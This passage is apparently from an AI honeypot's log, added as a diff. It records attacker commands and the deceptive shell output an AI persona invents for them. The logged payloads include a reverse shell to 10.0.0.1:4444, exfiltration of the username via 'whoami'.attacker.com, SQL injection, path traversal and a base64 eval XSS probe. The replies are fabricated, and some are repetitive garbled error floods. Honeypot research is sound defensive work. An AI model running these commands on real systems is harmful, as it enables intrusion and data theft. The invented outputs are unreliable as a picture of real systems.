Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code\nError: Error executing onerror handler\nError: Error executing JavaScript code\nError: Error executing alert function\nError: Error executing document.cookie\nError: Error executing JavaScript code",
+    "session_metadata": {
+        "prediction": "Reconnaissance"
+    },
+    "system_event": "AI Deception Generated",
+    "security_event": "Unknown",
+    "warning": null,
+    "error": null
+}
+2026-07-23 17:11:15,338 - {
+    "session_id": "2986a0f0",
+    "query": "javascript:eval(atob('YWxlcnQoJ1hTUycpOw=='))",
+    "response": "bash: javascript:eval(atob('YWxlcnQoJ1hTUycpOw=='): command not found",
+    "selected_personality": {
+        "name": "Friendly Server",
+        "hostname": "friendly-srv",
+        "user": "support",
+        "style": "friendly",
+        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
+        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
+    },
+    "threat_score": {
+        "score": 1,
+        "risk_level": "LOW",
+        "final_score": 1,
+        "threat_level": "LOW",
+        "base_score": 1,
+        "multiplier": 1.0,
+        "severity_indicator": "\ud83d\udfe2"
+    },
+    "attacker_profile": {
+        "curiosity": {
+            "commands_executed": 1,
+            "unique_commands": 1,
+            "directories_visited": 1,
+            "recon_commands": 0,
+            "persistence_attempts": 0,
+            "curiosity_score": 7
+        },
+        "engagement": {
+            "session_duration": 0,
+            "commands_executed": 1,
+            "successful_commands": 0,
+            "failed_commands": 1,
+            "files_accessed": 0,
+            "services_accessed": 0,
+            "engagement_score": 2,
+            "engagement_level": "LOW"
+        },
+        "behaviour": {
+            "Curiosity Score": 7,
+            "Persistence Score": "LOW",
+            "Interaction Depth": "LOW",
+            "Risk Score": 1,
+            "Session Complexity": "LOW"
+        },
+        "commands": [
+            "javascript:eval(atob('YWxlcnQoJ1hTUycpOw=='))"
+        ],
+        "confidence_score": 0.55
+    }
+}
+2026-07-23 17:11:15,338 - {"session_id": "2986a0f0", "command": "javascript:eval(atob('YWxlcnQoJ1hTUycpOw=='))", "attack_type": "Unknown", "risk_score": 1, "threat_level": "LOW"}
+2026-07-23 17:11:15,338 - {
+    "session_id": "2986a0f0",
+    "command": "javascript:eval(atob('YWxlcnQoJ1hTUycpOw=='))",
+    "ai_decision": "bash: javascript:eval(atob('YWxlcnQoJ1hTUycpOw=='): command not found",
+    "confidence_score": 0.5,
+    "conversation_metadata": {
+        "conversation_id": "2986a0f0",
+        "interaction_count": 1
+    },
+    "prediction_result": {
+        "next_prediction": "Reconnaissance",
+        "prediction_confidence": 0.5
+    },
+    "risk_score": 1,
+    "threat_level": "LOW"
+}
+2026-07-23 17:11:15,338 - {
+    "session_id": "2986a0f0",
+    "conversation_log": "Attacker executed: javascript:eval(atob('YWxlcnQoJ1hTUycpOw=='))",
+    "ai_decision": "bash: javascript:eval(atob('YWxlcnQoJ1hTUycpOw=='): command not found",
+    "session_metadata": {
+        "prediction": "Reconnaissance"
+    },
+    "system_event": "AI Deception Generated",
+    "security_event": "Unknown",
+    "warning": null,
+    "error": null
+}
+2026-07-23 17:11:29,211 - {
+    "session_id": "0afa0e44",
+    "query": "ls; cat /etc/passwd",
+    "response": "Welcome to Friendly Server!\n\nFriendly Server:~$ ls\ntotal 16\ndrwxr-xr-x  3 ubuntu ubuntu 4096 Jul 23 14:30 company_directory\ndrwxr-xr-x  3 ubuntu ubuntu 4096 Jul 23 14:30 documents\ndrwxr-xr-x  3 ubuntu ubuntu 4096 Jul 23 14:30 .env\ndrwxr-xr-x  3 ubuntu ubuntu 4096 Jul 23 14:30 .ssh\ndrwxr-xr-x  3 ubuntu ubuntu 4096 Jul 23 14:30 .aws\ndrwxr-xr-x  3 ubuntu ubuntu 4096 Jul 23 14:30 .slack\n-rw-r--r--  1 ubuntu ubuntu  220 Jul 23 14:30 notes.txt\n-rwxr-xr-x  1 ubuntu ubuntu   13 Jul 23 14:30 script.sh\n\nFriendly Server:~$ cat /etc/passwd\nroot:x:0:0:root:/root:/bin/bash\nubuntu:x:1000:1000::/home/ubuntu:/bin/bash",
+    "selected_personality": {
+        "name": "Friendly Server",
+        "hostname": "friendly-srv",
+        "user": "support",
+        "style": "friendly",
+        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
+        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
+    },
+    "threat_score": {
+        "score": 5,
+        "risk_level": "LOW",
+        "final_score": 5,
+        "threat_level": "LOW",
+        "base_score": 5,
+        "multiplier": 1.0,
+        "severity_indicator": "\ud83d\udfe2"
+    },
+    "attacker_profile": {
+        "curiosity": {
+            "commands_executed": 1,
+            "unique_commands": 1,
+            "directories_visited": 1,
+            "recon_commands": 0,
+            "persistence_attempts": 0,
+            "curiosity_score": 7
+        },
+        "engagement": {
+            "session_duration": 0,
+            "commands_executed": 1,
+            "successful_commands": 1,
+            "failed_commands": 0,
+            "files_accessed": 1,
+            "services_accessed": 0,
+            "engagement_score": 6,
+            "engagement_level": "LOW"
+        },
+        "behaviour": {
+            "Curiosity Score": 7,
+            "Persistence Score": "LOW",
+            "Interaction Depth": "LOW",
+            "Risk Score": 5,
+            "Session Complexity": "LOW"
+        },
+        "commands": [
+            "ls; cat /etc/passwd"
+        ],
+        "confidence_score": 0.55
+    }
+}
+2026-07-23 17:11:29,211 - {"session_id": "0afa0e44", "command": "ls; cat /etc/passwd", "attack_type": "Privilege Enumeration", "risk_score": 5, "threat_level": "LOW"}
+2026-07-23 17:11:29,211 - {
+    "session_id": "0afa0e44",
+    "command": "ls; cat /etc/passwd",
+    "ai_decision": "Welcome to Friendly Server!\n\nFriendly Server:~$ ls\ntotal 16\ndrwxr-xr-x  3 ubuntu ubuntu 4096 Jul 23 14:30 company_directory\ndrwxr-xr-x  3 ubuntu ubuntu 4096 Jul 23 14:30 documents\ndrwxr-xr-x  3 ubuntu ubuntu 4096 Jul 23 14:30 .env\ndrwxr-xr-x  3 ubuntu ubuntu 4096 Jul 23 14:30 .ssh\ndrwxr-xr-x  3 ubuntu ubuntu 4096 Jul 23 14:30 .aws\ndrwxr-xr-x  3 ubuntu ubuntu 4096 Jul 23 14:30 .slack\n-rw-r--r--  1 ubuntu ubuntu  220 Jul 23 14:30 notes.txt\n-rwxr-xr-x  1 ubuntu ubuntu   13 Jul 23 14:30 script.sh\n\nFriendly Server:~$ cat /etc/passwd\nroot:x:0:0:root:/root:/bin/bash\nubuntu:x:1000:1000::/home/ubuntu:/bin/bash",
+    "confidence_score": 0.9,
+    "conversation_metadata": {
+        "conversation_id": "0afa0e44",
+        "interaction_count": 1
+    },
+    "prediction_result": {
+        "next_prediction": "Reconnaissance",
+        "prediction_confidence": 0.9
+    },
+    "risk_score": 5,
+    "threat_level": "LOW"
+}
+2026-07-23 17:11:29,211 - {
+    "session_id": "0afa0e44",
+    "conversation_log": "Attacker executed: ls; cat /etc/passwd",
+    "ai_decision": "Welcome to Friendly Server!\n\nFriendly Server:~$ ls\ntotal 16\ndrwxr-xr-x  3 ubuntu ubuntu 4096 Jul 23 14:30 company_directory\ndrwxr-xr-x  3 ubuntu ubuntu 4096 Jul 23 14:30 documents\ndrwxr-xr-x  3 ubuntu ubuntu 4096 Jul 23 14:30 .env\ndrwxr-xr-x  3 ubuntu ubuntu 4096 Jul 23 14:30 .ssh\ndrwxr-xr-x  3 ubuntu ubuntu 4096 Jul 23 14:30 .aws\ndrwxr-xr-x  3 ubuntu ubuntu 4096 Jul 23 14:30 .slack\n-rw-r--r--  1 ubuntu ubuntu  220 Jul 23 14:30 notes.txt\n-rwxr-xr-x  1 ubuntu ubuntu   13 Jul 23 14:30 script.sh\n\nFriendly Server:~$ cat /etc/passwd\nroot:x:0:0:root:/root:/bin/bash\nubuntu:x:1000:1000::/home/ubuntu:/bin/bash",
+    "session_metadata": {
+        "prediction": "Reconnaissance"
+    },
+    "system_event": "AI Deception Generated",
+    "security_event": "Privilege Enumeration",
+    "warning": null,
+    "error": null
+}
+2026-07-23 17:11:55,573 - {
+    "session_id": "e71752dc",
+    "query": "echo test | bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+    "response": "bash: /bin/bash: cannot set uid: operation not permitted\nbash: /bin/bash: cannot set gid: operation not permitted\nbash: /bin/bash: cannot set groups: operation not permitted\nbash: /bin/bash: cannot set umask: operation not permitted\nbash: /bin/bash: cannot set environment: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash",
+    "selected_personality": {
+        "name": "Friendly Server",
+        "hostname": "friendly-srv",
+        "user": "support",
+        "style": "friendly",
+        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
+        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
+    },
+    "threat_score": {
+        "score": 15,
+        "risk_level": "LOW",
+        "final_score": 15,
+        "threat_level": "LOW",
+        "base_score": 15,
+        "multiplier": 1.0,
+        "severity_indicator": "\ud83d\udfe2"
+    },
+    "attacker_profile": {
+        "curiosity": {
+            "commands_executed": 1,
+            "unique_commands": 1,
+            "directories_visited": 1,
+            "recon_commands": 0,
+            "persistence_attempts": 0,
+            "curiosity_score": 7
+        },
+        "engagement": {
+            "session_duration": 0,
+            "commands_executed": 1,
+            "successful_commands": 1,
+            "failed_commands": 0,
+            "files_accessed": 0,
+            "services_accessed": 0,
+            "engagement_score": 4,
+            "engagement_level": "LOW"
+        },
+        "behaviour": {
+            "Curiosity Score": 7,
+            "Persistence Score": "LOW",
+            "Interaction Depth": "LOW",
+            "Risk Score": 15,
+            "Session Complexity": "LOW"
+        },
+        "commands": [
+            "echo test | bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
+        ],
+        "confidence_score": 0.55
+    }
+}
+2026-07-23 17:11:55,573 - {"session_id": "e71752dc", "command": "echo test | bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "attack_type": "Reverse Shell Attempt", "risk_score": 15, "threat_level": "LOW"}
+2026-07-23 17:11:55,573 - {
+    "session_id": "e71752dc",
+    "command": "echo test | bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+    "ai_decision": "bash: /bin/bash: cannot set uid: operation not permitted\nbash: /bin/bash: cannot set gid: operation not permitted\nbash: /bin/bash: cannot set groups: operation not permitted\nbash: /bin/bash: cannot set umask: operation not permitted\nbash: /bin/bash: cannot set environment: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash",
+    "confidence_score": 0.95,
+    "conversation_metadata": {
+        "conversation_id": "e71752dc",
+        "interaction_count": 1
+    },
+    "prediction_result": {
+        "next_prediction": "Reconnaissance",
+        "prediction_confidence": 0.95
+    },
+    "risk_score": 15,
+    "threat_level": "LOW"
+}
+2026-07-23 17:11:55,573 - {
+    "session_id": "e71752dc",
+    "conversation_log": "Attacker executed: echo test | bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+    "ai_decision": "bash: /bin/bash: cannot set uid: operation not permitted\nbash: /bin/bash: cannot set gid: operation not permitted\nbash: /bin/bash: cannot set groups: operation not permitted\nbash: /bin/bash: cannot set umask: operation not permitted\nbash: /bin/bash: cannot set environment: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash: /bin/bash: cannot set shell: operation not permitted\nbash",
+    "session_metadata": {
+        "prediction": "Reconnaissance"
+    },
+    "system_event": "AI Deception Generated",
+    "security_event": "Reverse Shell Attempt",
+    "warning": null,
+    "error": null
+}
+2026-07-23 17:12:19,834 - {
+    "session_id": "9b256f75",
+    "query": "ping `whoami`.attacker.com",
+    "response": "64 bytes from 142.250.190.46: icmp_seq=1 ttl=116 time=12.4 ms\n64 bytes from 142.250.190.46: icmp_seq=2 ttl=116 time=11.8 ms\n64 bytes from 142.250.190.46: icmp_seq=3 ttl=116 time=12.1 ms\n--- friendly-srv.attacker.com ping statistics ---\n3 packets transmitted, 3 received, 0% packet loss, time 2003ms\nrtt min/avg/max/mdev = 11.821/12.115/12.432/0.252 ms",
+    "selected_personality": {
+        "name": "Friendly Server",
+        "hostname": "friendly-srv",
+        "user": "support",
+        "style": "friendly",
+        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
+        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
+    },
+    "threat_score": {
+        "score": 3,
+        "risk_level": "LOW",
+        "final_score": 3,
+        "threat_level": "LOW",
+        "base_score": 3,
+        "multiplier": 1.0,
+        "severity_indicator": "\ud83d\udfe2"
+    },
+    "attacker_profile": {
+        "curiosity": {
+            "commands_executed": 1,
+            "unique_commands": 1,
+            "directories_visited": 1,
+            "recon_commands": 1,
+            "persistence_attempts": 0,
+            "curiosity_score": 12
+        },
+        "engagement": {
+            "session_duration": 0,
+            "commands_executed": 1,
+            "successful_commands": 1,
+            "failed_commands": 0,
+            "files_accessed": 0,
+            "services_accessed": 0,
+            "engagement_score": 4,
+            "engagement_level": "LOW"
+        },
+        "behaviour": {
+            "Curiosity Score": 12,
+            "Persistence Score": "LOW",
+            "Interaction Depth": "LOW",
+            "Risk Score": 3,
+            "Session Complexity": "LOW"
+        },
+        "commands": [
+            "ping `whoami`.attacker.com"
+        ],
+        "confidence_score": 0.55
+    }
+}
+2026-07-23 17:12:19,834 - {"session_id": "9b256f75", "command": "ping `whoami`.attacker.com", "attack_type": "Reconnaissance", "risk_score": 3, "threat_level": "LOW"}
+2026-07-23 17:12:19,834 - {
+    "session_id": "9b256f75",
+    "command": "ping `whoami`.attacker.com",
+    "ai_decision": "64 bytes from 142.250.190.46: icmp_seq=1 ttl=116 time=12.4 ms\n64 bytes from 142.250.190.46: icmp_seq=2 ttl=116 time=11.8 ms\n64 bytes from 142.250.190.46: icmp_seq=3 ttl=116 time=12.1 ms\n--- friendly-srv.attacker.com ping statistics ---\n3 packets transmitted, 3 received, 0% packet loss, time 2003ms\nrtt min/avg/max/mdev = 11.821/12.115/12.432/0.252 ms",
+    "confidence_score": 0.85,
+    "conversation_metadata": {
+        "conversation_id": "9b256f75",
+        "interaction_count": 1
+    },
+    "prediction_result": {
+        "next_prediction": "Reconnaissance",
+        "prediction_confidence": 0.85
+    },
+    "risk_score": 3,
+    "threat_level": "LOW"
+}
+2026-07-23 17:12:19,834 - {
+    "session_id": "9b256f75",
+    "conversation_log": "Attacker executed: ping `whoami`.attacker.com",
+    "ai_decision": "64 bytes from 142.250.190.46: icmp_seq=1 ttl=116 time=12.4 ms\n64 bytes from 142.250.190.46: icmp_seq=2 ttl=116 time=11.8 ms\n64 bytes from 142.250.190.46: icmp_seq=3 ttl=116 time=12.1 ms\n--- friendly-srv.attacker.com ping statistics ---\n3 packets transmitted, 3 received, 0% packet loss, time 2003ms\nrtt min/avg/max/mdev = 11.821/12.115/12.432/0.252 ms",
+    "session_metadata": {
+        "prediction": "Reconnaissance"
+    },
+    "system_event": "AI Deception Generated",
+    "security_event": "Reconnaissance",
+    "warning": null,
+    "error": null
+}
+2026-07-23 17:12:19,905 - {
+    "session_id": "9b66e74f",
+    "query": "cat ../../../etc/passwd",
+    "response": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug Reporting:/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:Systemd Network Management:/:/usr/sbin/nologin\nsystemd-timesync:x:101:103:Systemd Time Synchronization:/:/usr/sbin/nologin\nmessagebus:x:102:106:D-Bus Message Bus:/nonexistent:/usr/sbin/nologin\nsyslog:x:103:110:Syslog:/home/syslog:/usr/sbin/nologin\n_apt:x:104:65534::/nonexistent:/usr/sbin/nologin\nuuidd:x:105:111:UUID Daemon:/run/uuidd:/usr/sbin/nologin\ntcpdump:x:106:112::/nonexistent:/usr/sbin/nologin\ntss:x:107:113:TPM Software Stack:/var/lib/tpm:/bin/false\nlandscape:x:108:114:Landscape Client:/var/lib/landscape:/usr/sbin/nologin\npollinate:x:109:1:Pollinate:/var/cache/pollinate:/bin/false\nmysql:x:110:115:MySQL Server:/nonexistent:/bin/false\npostgres:x:111:116:PostgreSQL Administrator:/var/lib/postgresql:/bin/bash\nredis:x:112:117:Redis Server:/var/lib/redis:/usr/sbin/nologin\ndocker:x:113:118:Docker Engine:/var/lib/docker:/usr/sbin/nologin\nnginx:x:114:119:Nginx Service:/var/cache/nginx:/usr/sbin/nologin\nubuntu:x:1000:1000:Ubuntu User:/home/ubuntu:/bin/bash\ndev:x:1001:1001:Developer:/home/dev:/bin/bash\nadmin:x:1002:1002:System Administrator:/home/admin:/bin/bash\nsupport:x:1003:1003:Support Engineer:/home/support:/bin/bash\nbackupuser:x:1004:1004:Backup Operator:/home/backupuser:/bin/bash",
+    "selected_personality": {
+        "name": "Friendly Server",
+        "hostname": "friendly-srv",
+        "user": "support",
+        "style": "friendly",
+        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
+        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
+    },
+    "threat_score": {
+        "score": 7,
+        "risk_level": "LOW",
+        "final_score": 7,
+        "threat_level": "LOW",
+        "base_score": 7,
+        "multiplier": 1.0,
+        "severity_indicator": "\ud83d\udfe2"
+    },
+    "attacker_profile": {
+        "curiosity": {
+            "commands_executed": 3,
+            "unique_commands": 2,
+            "directories_visited": 1,
+            "recon_commands": 0,
+            "persistence_attempts": 0,
+            "curiosity_score": 14
+        },
+        "engagement": {
+            "session_duration": 152,
+            "commands_executed": 3,
+            "successful_commands": 1,
+            "failed_commands": 2,
+            "files_accessed": 1,
+            "services_accessed": 0,
+            "engagement_score": 30,
+            "engagement_level": "LOW"
+        },
+        "behaviour": {
+            "Curiosity Score": 14,
+            "Persistence Score": "LOW",
+            "Interaction Depth": "LOW",
+            "Risk Score": 7,
+            "Session Complexity": "LOW"
+        },
+        "commands": [
+            "' OR '1'='1",
+            "' OR '1'='1",
+            "cat ../../../etc/passwd"
+        ],
+        "confidence_score": 0.65
+    }
+}
+2026-07-23 17:12:19,905 - {"session_id": "9b66e74f", "command": "cat ../../../etc/passwd", "attack_type": "Privilege Enumeration", "risk_score": 7, "threat_level": "LOW"}
+2026-07-23 17:12:19,905 - {
+    "session_id": "9b66e74f",
+    "command": "cat ../../../etc/passwd",
